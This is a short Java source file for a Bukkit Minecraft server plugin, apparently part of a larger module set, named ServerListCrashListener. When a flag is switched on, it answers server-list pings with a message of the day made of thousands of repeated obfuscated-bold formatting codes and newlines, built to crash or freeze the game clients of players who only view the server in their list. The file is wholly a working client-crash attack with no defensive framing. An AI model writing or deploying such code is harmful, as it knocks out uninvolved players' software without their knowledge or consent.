package net.korex.api.modules.serverlistcrash;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.server.ServerListPingEvent;

public class ServerListCrashListener implements Listener{

	private String getCrashMotd() {
		StringBuilder builder = new StringBuilder();
		
		for(int i = 0; i < 4020; i++) {
			builder.append("§k§l\n");
		}
		
		return builder.toString();
	}
	
	@EventHandler
	public void onListPing(ServerListPingEvent e) {
		if(ServerListCrashCommand.enabled) {
			e.setMotd(getCrashMotd());
		}
	}
	
}
